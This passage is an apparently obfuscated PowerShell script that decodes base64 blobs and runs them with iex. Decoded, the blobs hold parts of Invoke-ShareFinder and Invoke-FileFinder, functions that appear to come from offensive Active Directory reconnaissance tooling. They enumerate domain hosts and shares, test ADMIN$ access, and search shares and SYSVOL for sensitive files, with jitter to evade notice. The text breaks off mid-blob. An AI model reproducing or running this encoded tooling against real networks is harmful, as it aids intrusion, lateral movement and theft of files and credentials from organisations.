0KICAgICAgICAkTm9QaW5nLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJENoZWNrU2hhcmVBY2Nlc3MsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkQ2hlY2tBZG1pbiwKICAgICAgICBbVUludDMyXQogICAgICAgICREZWxheSA9IDAsCiAgICAgICAgW0RvdWJsZV0KICAgICAgICAkSml0dGVyID0gLjMsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbkNvbnRyb2xsZXIsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkU2VhcmNoRm9yZXN0LAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsMTAwKV0gCiAgICAgICAgW0ludF0KICAgICAgICAkVGhyZWFkcwogICAgKQogICAgYmVnaW4gewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RlYnVnJ10pIHsKICAgICAgICAgICAgJERlYnVnUHJlZmVyZW5jZSA9ICdDb250aW51ZScKICAgICAgICB9CiAgICAgICAgJFJhbmRObyA9IE5ldy1PYmplY3QgU3lzdGVtLlJhbmRvbQogICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBSdW5uaW5nIEludm9rZS1TaGFyZUZpbmRlciB3aXRoIGRlbGF5IG9mICREZWxheSIKICAgICAgICBbU3RyaW5nW11dICRFeGNsdWRlZFNoYXJlcyA9IEAoJycpCiAgICAgICAgaWYgKCRFeGNsdWRlUHJpbnQpIHsKICAgICAgICAgICAgJEV4Y2x1ZGVkU2hhcmVzID0gJEV4Y2x1ZGVkU2hhcmVzICsgIlBSSU5UJCIKICAgICAgICB9CiAgICAgICAgaWYgKCRFeGNsdWRlSVBDKSB7CiAgICAgICAgICAgICRFeGNsdWRlZFNoYXJlcyA9ICRFeGNsdWRlZFNoYXJlcyArICJJUEMkIgogICAgICAgIH0KICAgICAgICBpZiAoJEV4Y2x1ZGVTdGFuZGFyZCkgewogICAgICAgICAgICAkRXhjbHVkZWRTaGFyZXMgPSBAKCcnLCAiQURNSU4kIiwgIklQQyQiLCAiQyQiLCAiUFJJTlQkIikKICAgICAgICB9CiAgICAgICAgaWYoISRDb21wdXRlck5hbWUpIHsgCiAgICAgICAgICAgIGlmKCREb21haW4pIHsKICAgICAgICAgICAgICAgICRUYXJnZXREb21haW5zID0gQCgkRG9tYWluKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZigkU2VhcmNoRm9yZXN0KSB7CiAgICAgICAgICAgICAgICAkVGFyZ2V0RG9tYWlucyA9IEdldC1OZXRGb3Jlc3REb21haW4gfCBGb3JFYWNoLU9iamVjdCB7ICRfLk5hbWUgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJFRhcmdldERvbWFpbnMgPSBAKCAoR2V0LU5ldERvbWFpbikubmFtZSApCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYoJENvbXB1dGVyRmlsZSkgewogICAgICAgICAgICAgICAgJENvbXB1dGVyTmFtZSA9IEdldC1Db250ZW50IC1QYXRoICRDb21wdXRlckZpbGUKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIFthcnJheV0kQ29tcHV0ZXJOYW1lID0gQCgpCiAgICAgICAgICAgICAgICBGb3JFYWNoICgkRG9tYWluIGluICRUYXJnZXREb21haW5zKSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFF1ZXJ5aW5nIGRvbWFpbiAkRG9tYWluIGZvciBob3N0cyIKICAgICAgICAgICAgICAgICAgICAkQ29tcHV0ZXJOYW1lICs9IEdldC1OZXRDb21wdXRlciAtRG9tYWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLUZpbHRlciAkQ29tcHV0ZXJGaWx0ZXIgLUFEU3BhdGggJENvbXB1dGVyQURTcGF0aAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICRDb21wdXRlck5hbWUgPSAkQ29tcHV0ZXJOYW1lIHwgV2hlcmUtT2JqZWN0IHsgJF8gfSB8IFNvcnQtT2JqZWN0IC1VbmlxdWUgfCBTb3J0LU9iamVjdCB7IEdldC1SYW5kb20gfQogICAgICAgICAgICBpZigkKCRDb21wdXRlck5hbWUuY291bnQpIC1lcSAwKSB7CiAgICAgICAgICAgICAgICB0aHJvdyAiTm8gaG9zdHMgZm91bmQhIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICRIb3N0RW51bUJsb2NrID0gewogICAgICAgICAgICBwYXJhbSgkQ29tcHV0ZXJOYW1lLCAkUGluZywgJENoZWNrU2hhcmVBY2Nlc3MsICRFeGNsdWRlZFNoYXJlcywgJENoZWNrQWRtaW4pCiAgICAgICAgICAgICRVcCA9ICRUcnVlCiAgICAgICAgICAgIGlmKCRQaW5nKSB7CiAgICAgICAgICAgICAgICAkVXAgPSBUZXN0LUNvbm5lY3Rpb24gLUNvdW50IDEgLVF1aWV0IC1Db21wdXRlck5hbWUgJENvbXB1dGVyTmFtZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKCRVcCkgewogICAgICAgICAgICAgICAgJFNoYXJlcyA9IEdldC1OZXRTaGFyZSAtQ29tcHV0ZXJOYW1lICRDb21wdXRlck5hbWUKICAgICAgICAgICAgICAgIEZvckVhY2ggKCRTaGFyZSBpbiAkU2hhcmVzKSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtRGVidWcgIlsqXSBTZXJ2ZXIgc2hhcmU6ICRTaGFyZSIKICAgICAgICAgICAgICAgICAgICAkTmV0TmFtZSA9ICRTaGFyZS5zaGkxX25ldG5hbWUKICAgICAgICAgICAgICAgICAgICAkUmVtYXJrID0gJFNoYXJlLnNoaTFfcmVtYXJrCiAgICAgICAgICAgICAgICAgICAgJFBhdGggPSAnXFwnKyRDb21wdXRlck5hbWUrJ1wnKyROZXROYW1lCiAgICAgICAgICAgICAgICAgICAgaWYgKCgkTmV0TmFtZSkgLWFuZCAoJE5ldE5hbWUudHJpbSgpIC1uZSAnJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJENoZWNrQWRtaW4pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCROZXROYW1lLlRvVXBwZXIoKSAtZXEgIkFETUlOJCIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTnVsbCA9IFtJTy5EaXJlY3RvcnldOjpHZXRGaWxlcygkUGF0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIlxcJENvbXB1dGVyTmFtZVwkTmV0TmFtZSBgdC0gJFJlbWFyayIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1EZWJ1ZyAiRXJyb3IgYWNjZXNzaW5nIHBhdGggJFBhdGggOiAkXyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmICgkRXhjbHVkZWRTaGFyZXMgLU5vdENvbnRhaW5zICROZXROYW1lLlRvVXBwZXIoKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJENoZWNrU2hhcmVBY2Nlc3MpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTnVsbCA9IFtJTy5EaXJlY3RvcnldOjpHZXRGaWxlcygkUGF0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIlxcJENvbXB1dGVyTmFtZVwkTmV0TmFtZSBgdC0gJFJlbWFyayIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1EZWJ1ZyAiRXJyb3IgYWNjZXNzaW5nIHBhdGggJFBhdGggOiAkXyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiXFwkQ29tcHV0ZXJOYW1lXCROZXROYW1lIGB0LSAkUmVtYXJrIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgcHJvY2VzcyB7CiAgICAgICAgaWYoJFRocmVhZHMpIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiVXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkcyA9ICRUaHJlYWRzIgogICAgICAgICAgICAkU2NyaXB0UGFyYW1zID0gQHsKICAgICAgICAgICAgICAgICdQaW5nJyA9ICQoLW5vdCAkTm9QaW5nKQogICAgICAgICAgICAgICAgJ0NoZWNrU2hhcmVBY2Nlc3MnID0gJENoZWNrU2hhcmVBY2Nlc3MKICAgICAgICAgICAgICAgICdFeGNsdWRlZFNoYXJlcycgPSAkRXhjbHVkZWRTaGFyZXMKICAgICAgICAgICAgICAgICdDaGVja0FkbWluJyA9ICRDaGVja0FkbWluCiAgICAgICAgICAgIH0KICAgICAgICAgICAgSW52b2tlLVRocmVhZGVkRnVuY3Rpb24gLUNvbXB1dGVyTmFtZSAkQ29tcHV0ZXJOYW1lIC1TY3JpcHRCbG9jayAkSG9zdEVudW1CbG9jayAtU2NyaXB0UGFyYW1ldGVycyAkU2NyaXB0UGFyYW1zCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBpZigtbm90ICROb1BpbmcgLWFuZCAoJENvbXB1dGVyTmFtZS5jb3VudCAtbmUgMSkpIHsKICAgICAgICAgICAgICAgICRQaW5nID0ge3BhcmFtKCRDb21wdXRlck5hbWUpIGlmKFRlc3QtQ29ubmVjdGlvbiAtQ29tcHV0ZXJOYW1lICRDb21wdXRlck5hbWUgLUNvdW50IDEgLVF1aWV0IC1FcnJvckFjdGlvbiBTdG9wKXskQ29tcHV0ZXJOYW1lfX0KICAgICAgICAgICAgICAgICRDb21wdXRlck5hbWUgPSBJbnZva2UtVGhyZWFkZWRGdW5jdGlvbiAtTm9JbXBvcnRzIC1Db21wdXRlck5hbWUgJENvbXB1dGVyTmFtZSAtU2NyaXB0QmxvY2sgJFBpbmcgLVRocmVhZHMgMTAwCiAgICAgICAgICAgIH0KICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFRvdGFsIG51bWJlciBvZiBhY3RpdmUgaG9zdHM6ICQoJENvbXB1dGVyTmFtZS5jb3VudCkiCiAgICAgICAgICAgICRDb3VudGVyID0gMAogICAgICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAgICAgJENvdW50ZXIgPSAkQ291bnRlciArIDEKICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzICRSYW5kTm8uTmV4dCgoMS0kSml0dGVyKSokRGVsYXksICgxKyRKaXR0ZXIpKiREZWxheSkKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBFbnVtZXJhdGluZyBzZXJ2ZXIgJENvbXB1dGVyICgkQ291bnRlciBvZiAkKCRDb21wdXRlck5hbWUuY291bnQpKSIKICAgICAgICAgICAgICAgIEludm9rZS1Db21tYW5kIC1TY3JpcHRCbG9jayAkSG9zdEVudW1CbG9jayAtQXJndW1lbnRMaXN0ICRDb21wdXRlciwgJEZhbHNlLCAkQ2hlY2tTaGFyZUFjY2VzcywgJEV4Y2x1ZGVkU2hhcmVzLCAkQ2hlY2tBZG1pbgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gSW52b2tlLUZpbGVGaW5kZXIgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MCxWYWx1ZUZyb21QaXBlbGluZT0kVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0cycpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lLAogICAgICAgIFtWYWxpZGF0ZVNjcmlwdCh7VGVzdC1QYXRoIC1QYXRoICRfIH0pXQogICAgICAgIFtBbGlhcygnSG9zdExpc3QnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlckZpbGUsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJGaWx0ZXIsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJBRFNwYXRoLAogICAgICAgIFtWYWxpZGF0ZVNjcmlwdCh7VGVzdC1QYXRoIC1QYXRoICRfIH0pXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNoYXJlTGlzdCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRPZmZpY2VEb2NzLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEZyZXNoRVhFcywKICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFRlcm1zLAogICAgICAgIFtWYWxpZGF0ZVNjcmlwdCh7VGVzdC1QYXRoIC1QYXRoICRfIH0pXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFRlcm1MaXN0LAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExhc3RBY2Nlc3NUaW1lLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExhc3RXcml0ZVRpbWUsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ3JlYXRpb25UaW1lLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEluY2x1ZGVDLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEluY2x1ZGVBZG1pbiwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRFeGNsdWRlRm9sZGVycywKICAgICAgICBbU3dpdGNoXQogICAgICAgICRFeGNsdWRlSGlkZGVuLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJENoZWNrV3JpdGVBY2Nlc3MsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkT3V0RmlsZSwKICAgICAgICBbU3dpdGNoXQogICAgICAgICROb0Nsb2JiZXIsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkTm9QaW5nLAogICAgICAgIFtVSW50MzJdCiAgICAgICAgJERlbGF5ID0gMCwKICAgICAgICBbRG91YmxlXQogICAgICAgICRKaXR0ZXIgPSAuMywKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluQ29udHJvbGxlciwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRTZWFyY2hGb3Jlc3QsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkU2VhcmNoU1lTVk9MLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsMTAwKV0gCiAgICAgICAgW0ludF0KICAgICAgICAkVGhyZWFkcywKICAgICAgICBbU3dpdGNoXQogICAgICAgICRVc2VQU0RyaXZlLAogICAgICAgIFtTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBiZWdpbiB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVidWcnXSkgewogICAgICAgICAgICAkRGVidWdQcmVmZXJlbmNlID0gJ0NvbnRpbnVlJwogICAgICAgIH0KICAgICAgICAkUmFuZE5vID0gTmV3LU9iamVjdCBTeXN0ZW0uUmFuZG9tCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFJ1bm5pbmcgSW52b2tlLUZpbGVGaW5kZXIgd2l0aCBkZWxheSBvZiAkRGVsYXkiCiAgICAgICAgJFNoYXJlcyA9IEAoKQogICAgICAgIFtTdHJpbmdbXV0gJEV4Y2x1ZGVkU2hhcmVzID0gQCgiQyQiLCAiQURNSU4kIikKICAgICAgICBpZiAoJEluY2x1ZGVDKSB7CiAgICAgICAgICAgIGlmICgkSW5jbHVkZUFkbWluKSB7CiAgICAgICAgICAgICAgICAkRXhjbHVkZWRTaGFyZXMgPSBAKCkKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRFeGNsdWRlZFNoYXJlcyA9IEAoIkFETUlOJCIpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKCRJbmNsdWRlQWRtaW4pIHsKICAgICAgICAgICAgaWYgKCRJbmNsdWRlQykgewogICAgICAgICAgICAgICAgJEV4Y2x1ZGVkU2hhcmVzID0gQCgpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkRXhjbHVkZWRTaGFyZXMgPSBAKCJDJCIpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYoISROb0Nsb2JiZXIpIHsKICAgICAgICAgICAgaWYgKCRPdXRGaWxlIC1hbmQgKFRlc3QtUGF0aCAtUGF0aCAkT3V0RmlsZSkpIHsgUmVtb3ZlLUl0ZW0gLVBhdGggJE91dEZpbGUgfQogICAgICAgIH0KICAgICAgICBpZiAoJFRlcm1MaXN0KSB7CiAgICAgICAgICAgIEZvckVhY2ggKCRUZXJtIGluIEdldC1Db250ZW50IC1QYXRoICRUZXJtTGlzdCkgewogICAgICAgICAgICAgICAgaWYgKCgkVGVybSAtbmUgJE51bGwpIC1hbmQgKCRUZXJtLnRyaW0oKSAtbmUgJycpKSB7CiAgICAgICAgICAgICAgICAgICAgJFRlcm1zICs9ICRUZXJtCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYoJERvbWFpbikgewogICAgICAgICAgICAkVGFyZ2V0RG9tYWlucyA9IEAoJERvbWFpbikKICAgICAgICB9CiAgICAgICAgZWxzZWlmKCRTZWFyY2hGb3Jlc3QpIHsKICAgICAgICAgICAgJFRhcmdldERvbWFpbnMgPSBHZXQtTmV0Rm9yZXN0RG9tYWluIHwgRm9yRWFjaC1PYmplY3QgeyAkXy5OYW1lIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRUYXJnZXREb21haW5zID0gQCggKEdldC1OZXREb21haW4pLm5hbWUgKQogICAgICAgIH0KICAgICAgICBpZigkU2hhcmVMaXN0KSB7CiAgICAgICAgICAgIEZvckVhY2ggKCRJdGVtIGluIEdldC1Db250ZW50IC1QYXRoICRTaGFyZUxpc3QpIHsKICAgICAgICAgICAgICAgIGlmICgoJEl0ZW0gLW5lICROdWxsKSAtYW5kICgkSXRlbS50cmltKCkgLW5lICcnKSkgewogICAgICAgICAgICAgICAgICAgICRTaGFyZSA9ICRJdGVtLlNwbGl0KCJgdCIpWzBdCiAgICAgICAgICAgICAgICAgICAgJFNoYXJlcyArPSAkU2hhcmUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZigkU2VhcmNoU1lTVk9MKSB7CiAgICAgICAgICAgIEZvckVhY2ggKCREb21haW4gaW4gJFRhcmdldERvbWFpbnMpIHsKICAgICAgICAgICAgICAgICREQ1NlYXJjaFBhdGggPSAiXFwkRG9tYWluXFNZU1ZPTFwiCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gQWRkaW5nIHNoYXJlIHNlYXJjaCBwYXRoICREQ1NlYXJjaFBhdGgiCiAgICAgICAgICAgICAgICAkU2hhcmVzICs9ICREQ1NlYXJjaFBhdGgKICAgICAgICAgICAgfQogICAgICAgICAgICBpZighJFRlcm1zKSB7CiAgICAgICAgICAgICAgICAkVGVybXMgPSBAKCcudmJzJywgJy5iYXQnLCAnLnBzMScpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIGlmKCRDb21wdXRlckZpbGUpIHsKICAgICAgICAgICAgICAgICRDb21wdXRlck5hbWUgPSBHZXQtQ29udGVudCAtUGF0aCAkQ29tcHV0ZXJGaWxlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICBbYXJyYXldJENvbXB1dGVyTmFtZSA9IEAoKQogICAgICAgICAgICAgICAgRm9yRWFjaCAoJERvbWFpbiBpbiAkVGFyZ2V0RG9tYWlucykgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBRdWVyeWluZyBkb21haW4gJERvbWFpbiBmb3IgaG9zdHMiCiAgICAgICAgICAgICAgICAgICAgJENvbXB1dGVyTmFtZSArPSBHZXQtTmV0Q29tcHV0ZXIgLUZpbHRlciAkQ29tcHV0ZXJGaWx0ZXIgLUFEU3BhdGggJENvbXB1dGVyQURTcGF0aCAtRG9tYWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJENvbXB1dGVyTmFtZSB8IFdoZXJlLU9iamVjdCB7ICRfIH0gfCBTb3J0LU9iamVjdCAtVW5pcXVlIHwgU29ydC1PYmplY3QgeyBHZXQtUmFuZG9tIH0KICAgICAgICAgICAgaWYoJCgkQ29tcHV0ZXJOYW1lLkNvdW50KSAtZXEgMCkgewogICAgICAgICAgICAgICAgdGhyb3cgIk5vIGhvc3RzIGZvdW5kISIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkSG9zdEVudW1CbG9jayA9IHsKICAgICAgICAgICAgcGFyYW0oJENvbXB1dGVyTmFtZSwgJFBpbmcsICRFeGNsdWRlZFNoYXJlcywgJFRlcm1zLCAkRXhjbHVkZUZvbGRlcnMsICRPZmZpY2VEb2NzLCAkRXhjbHVkZUhpZGRlbiwgJEZyZXNoRVhFcywgJENoZWNrV3JpdGVBY2Nlc3MsICRPdXRGaWxlLCAkVXNlUFNEcml2ZSwgJENyZWRlbnRpYWwpCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkNvbXB1dGVyTmFtZTogJENvbXB1dGVyTmFtZSIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRXhjbHVkZWRTaGFyZXM6ICRFeGNsdWRlZFNoYXJlcyIKICAgICAgICAgICAgJFNlYXJjaFNoYXJlcyA9IEAoKQogICAgICAgICAgICBpZigkQ29tcHV0ZXJOYW1lLlN0YXJ0c1dpdGgoIlxcIikpIHsKICAgICAgICAgICAgICAgICRTZWFyY2hTaGFyZXMgKz0gJENvbXB1dGVyTmFtZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJFVwID0gJFRydWUKICAgICAgICAgICAgICAgIGlmKCRQaW5nKSB7CiAgICAgICAgICAgICAgICAgICAgJFVwID0gVGVzdC1Db25uZWN0aW9uIC1Db3VudCAxIC1RdWlldCAtQ29tcHV0ZXJOYW1lICRDb21wdXRlck5hbWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmKCRVcCkgewogICAgICAgICAgICAgICAgICAgICRTaGFyZXMgPSBHZXQtTmV0U2hhcmUgLUNvbXB1dGVyTmFtZSAkQ29tcHV0ZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgRm9yRWFjaCAoJFNoYXJlIGluICRTaGFyZXMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE5ldE5hbWUgPSAkU2hhcmUuc2hpMV9uZXRuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRQYXRoID0gJ1xcJyskQ29tcHV0ZXJOYW1lKydcJyskTmV0TmFtZQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKCROZXROYW1lKSAtYW5kICgkTmV0TmFtZS50cmltKCkgLW5lICcnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRFeGNsdWRlZFNoYXJlcyAtTm90Q29udGFpbnMgJE5ldE5hbWUuVG9VcHBlcigpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE51bGwgPSBbSU8uRGlyZWN0b3J5XTo6R2V0RmlsZXMoJFBhdGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hTaGFyZXMgKz0gJFBhdGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1EZWJ1ZyAiWyFdIE5vIGFjY2VzcyB0byAkUGF0aCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgRm9yRWFjaCgkU2hhcmUgaW4gJFNlYXJjaFNoYXJlcykgewogICAgICAgICAgICAgICAgJFNlYXJjaEFyZ3MgPSAgQHsKICAgICAgICAgICAgICAgICAgICAnUGF0aCcgPSAkU2hhcmUKICAgICAgICAgICAgICAgICAgICAnVGVybXMnID0gJFRlcm1zCiAgICAgICAgICAgICAgICAgICAgJ09mZmljZURvY3MnID0gJE9mZmljZURvY3MKICAgICAgICAgICAgICAgICAgICAnRnJlc2hFWEVzJyA9ICRGcmVzaEVYRXMKICAgICAgICAgICAgICAgICAgICAnTGFzdEFjY2Vzc1RpbWUnID0gJExhc3RBY2Nlc3NUaW1lCiAgICAgICAgICAgICAgICAgICAgJ0xhc3RXcml0ZVRpbWUnID0gJExhc3RXcml0ZVRpbWUKICAgICAgICAgICAgICAgICAgICAnQ3JlYXRpb25UaW1lJyA9ICRDcmVhdGlvblRpbWUKICAgICAgICAgICAgICAgICAgICAnRXhjbHVkZUZvbGRlcnMnID0gJEV4Y2x1ZGVGb2xkZXJzCiAgICAgICAgICAgICAgICAgICAgJ0V4Y2x1ZGVIaWRkZW4nID0gJEV4Y2x1ZGVIaWRkZW4KICAgICAgICAgICAgICAgICAgICAnQ2hlY2tXcml0ZUFjY2VzcycgPSAkQ2hlY2tXcml0ZUFjY2VzcwogICAgICAgICAgICAgICAgICAgICdPdXRGaWxlJyA9ICRPdXRGaWxlCiAgICAgICAgICAgICAgICAgICAgJ1VzZVBTRHJpdmUnID0gJFVzZVBTRHJpdmUKICAgICAgICAgICAgICAgICAgICAnQ3JlZGVudGlhbCcgPSAkQ3JlZGVudGlhbAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgRmluZC1JbnRlcmVzdGluZ0ZpbGUgQFNlYXJjaEFyZ3MKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIHByb2Nlc3MgewogICAgICAgIGlmKCRUaHJlYWRzKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlVzaW5nIHRocmVhZGluZyB3aXRoIHRocmVhZHMgPSAkVGhyZWFkcyIKICAgICAgICAgICAgJFNjcmlwdFBhcmFtcyA9IEB7CiAgICAgICAgICAgICAgICAnUGluZycgPSAkKC1ub3QgJE5vUGluZykKICAgICAgICAgICAgICAgICdFeGNsdWRlZFNoYXJlcycgPSAkRXhjbHVkZWRTaGFyZXMKICAgICAgICAgICAgICAgICdUZXJtcycgPSAkVGVybXMKICAgICAgICAgICAgICAgICdFeGNsdWRlRm9sZGVycycgPSAkRXhjbHVkZUZvbGRlcnMKICAgICAgICAgICAgICAgICdPZmZpY2VEb2NzJyA9ICRPZmZpY2VEb2NzCiAgICAgICAgICAgICAgICAnRXhjbHVkZUhpZGRlbicgPSAkRXhjbHVkZUhpZGRlbgogICAgICAgICAgICAgICAgJ0ZyZXNoRVhFcycgPSAkRnJlc2hFWEVzCiAgICAgICAgICAgICAgICAnQ2hlY2tXcml0ZUFjY2VzcycgPSAkQ2hlY2tXcml0ZUFjY2VzcwogICAgICAgICAgICAgICAgJ091dEZpbGUnID0gJE91dEZpbGUKICAgICAgICAgICAgICAgICdVc2VQU0RyaXZlJyA9ICRVc2VQU0RyaXZlCiAgICAgICAgICAgICAgICAnQ3JlZGVudGlhbCcgPSAkQ3JlZGVudGlhbAogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKCRTaGFyZXMpIHsKICAgICAgICAgICAgICAgIEludm9rZS1UaHJlYWRlZEZ1bmN0aW9uIC1Db21wdXRlck5hbWUgJFNoY